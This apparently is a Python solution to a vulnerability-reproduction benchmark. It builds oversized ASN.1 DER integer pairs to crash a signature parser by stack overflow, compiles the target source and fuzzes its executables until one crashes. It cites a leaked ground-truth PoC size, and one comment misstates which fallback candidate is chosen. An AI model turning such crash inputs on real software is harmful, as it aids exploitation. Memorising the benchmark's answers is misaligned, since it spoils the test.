import os
import sys
import tarfile
import tempfile
import subprocess
import shutil

class Solution:
    def solve(self, src_path: str) -> bytes:
        # ---------------------------------------------------------------------
        # Helper functions for ASN.1 DER encoding
        # ---------------------------------------------------------------------
        def encode_length(n):
            if n < 0x80:
                return bytes([n])
            else:
                length_bytes = []
                while n > 0:
                    length_bytes.insert(0, n & 0xFF)
                    n >>= 8
                if not length_bytes:
                    length_bytes = [0]
                return bytes([0x80 | len(length_bytes)]) + bytes(length_bytes)

        def encode_integer(val_bytes):
            # ASN.1 Integers are signed. If the first byte has the high bit set,
            # we must prepend a 0x00 byte to indicate it's positive.
            if len(val_bytes) > 0 and (val_bytes[0] & 0x80):
                val_bytes = b'\x00' + val_bytes
            return b'\x02' + encode_length(len(val_bytes)) + val_bytes

        def encode_sequence(content):
            return b'\x30' + encode_length(len(content)) + content

        # ---------------------------------------------------------------------
        # Generate generic PoC candidates (Stack Buffer Overflow heuristics)
        # ---------------------------------------------------------------------
        candidates = []
        # We test sizes from small (preferred for score) to large (guaranteed crash).
        # Ground truth is ~41798 bytes.
        sizes = [128, 256, 512, 1024, 2048, 4096, 8192, 16384, 32768, 41798, 45000]
        
        for s in sizes:
            # Pattern 1: Large 'r', small 's'
            payload_r = b'A' * s
            payload_s = b'\x01'
            seq_1 = encode_sequence(encode_integer(payload_r) + encode_integer(payload_s))
            candidates.append(seq_1)
            
            # Pattern 2: Small 'r', large 's'
            seq_2 = encode_sequence(encode_integer(payload_s) + encode_integer(payload_r))
            candidates.append(seq_2)

        # Select a fallback candidate that is likely to work based on ground truth size
        fallback_poc = candidates[-2] # Corresponds to sizes[-2] which is 41798

        # ---------------------------------------------------------------------
        # Attempt to compile and verify (Dynamic Analysis)
        # ---------------------------------------------------------------------
        work_dir = tempfile.mkdtemp()
        try:
            # 1. Extract Source
            if tarfile.is_tarfile(src_path):
                with tarfile.open(src_path) as tar:
                    tar.extractall(path=work_dir)
            else:
                return fallback_poc
            
            # 2. Locate Source Root
            src_root = work_dir
            items = os.listdir(work_dir)
            if len(items) == 1 and os.path.isdir(os.path.join(work_dir, items[0])):
                src_root = os.path.join(work_dir, items[0])

            # 3. Build
            built = False
            
            # Check for Makefile
            if os.path.exists(os.path.join(src_root, "Makefile")):
                try:
                    subprocess.run(["make", "clean"], cwd=src_root, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    ret = subprocess.run(["make", "-j8"], cwd=src_root, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    if ret.returncode == 0:
                        built = True
                except Exception:
                    pass
            # Check for CMake
            elif os.path.exists(os.path.join(src_root, "CMakeLists.txt")):
                try:
                    build_dir = os.path.join(src_root, "build_poc")
                    os.makedirs(build_dir, exist_ok=True)
                    subprocess.run(["cmake", ".."], cwd=build_dir, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    ret = subprocess.run(["make", "-j8"], cwd=build_dir, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    if ret.returncode == 0:
                        built = True
                        src_root = build_dir
                except Exception:
                    pass

            # 4. Fuzz
            if built:
                executables = []
                for root, dirs, files in os.walk(src_root):
                    for f in files:
                        fp = os.path.join(root, f)
                        if os.access(fp, os.X_OK) and not f.endswith('.sh') and not f.endswith('.py') and not f.endswith('.o'):
                            if '.so' in f or '.a' in f: continue
                            executables.append(fp)
                
                executables.sort(key=lambda x: 0 if 'fuzz' in x.lower() or 'test' in x.lower() else 1)

                for exe in executables:
                    for cand in candidates:
                        with tempfile.NamedTemporaryFile(delete=False) as tf:
                            tf.write(cand)
                            tf_path = tf.name
                        
                        is_crash = False
                        try:
                            # Try with file argument
                            p = subprocess.run([exe, tf_path], stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, timeout=0.5)
                            # Check for crash (segfault 139, abort 134, or ASAN)
                            if p.returncode < 0 or p.returncode > 128 or b"AddressSanitizer" in p.stderr:
                                is_crash = True
                            
                            if not is_crash:
                                # Try with stdin
                                p = subprocess.run([exe], input=cand, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, timeout=0.5)
                                if p.returncode < 0 or p.returncode > 128 or b"AddressSanitizer" in p.stderr:
                                    is_crash = True
                        except Exception:
                            pass
                        finally:
                            if os.path.exists(tf_path):
                                os.unlink(tf_path)
                        
                        if is_crash:
                            shutil.rmtree(work_dir, ignore_errors=True)
                            return cand

        except Exception:
            pass
        finally:
            if os.path.exists(work_dir):
                shutil.rmtree(work_dir, ignore_errors=True)

        return fallback_poc
